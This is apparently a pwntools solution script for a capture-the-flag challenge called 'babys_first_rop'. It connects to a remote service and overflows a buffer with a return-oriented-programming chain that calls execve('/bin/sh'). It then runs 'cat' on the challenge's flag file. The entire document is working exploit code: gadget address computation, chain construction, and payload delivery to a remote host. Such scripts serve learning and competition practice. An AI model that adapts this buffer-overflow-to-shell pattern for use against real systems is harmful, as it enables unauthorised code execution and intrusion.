#!/usr/bin/env python

from pwn import *

#p = process('./babys_first_rop')
p = remote('172.31.2.62', 47802)

def get_gadget(op1, op2):
    base = 0x601080
    return p64(base + op1*0x300 + op2*3)

text_addr = 0x631080
rop = ''
rop += get_gadget(0x90, 0x5f) # pop rdi
rop += p64(text_addr)
rop += get_gadget(0x90, 0x5e) # pop rsi
rop += p64(text_addr+0x10)
rop += get_gadget(0x90, 0x5a) # pop rdx
rop += p64(text_addr+0x8)
rop += get_gadget(0x90, 0x58) # pop rax
rop += p64(0x3b) # sys_execv
rop += get_gadget(0x0f, 0x05) # syscall

base_data = '/bin/sh\0' + p64(0) + p64(text_addr) +p64(0)
exploit = base_data + 'A'*(0x58-len(base_data)) + rop
p.send(exploit + 'B'*(0x100-len(exploit)))
#p.interactive()
p.sendline('cat /home/challenge/flag')
p.sendline('exit')
print p.recvall().rstrip()
p.close()
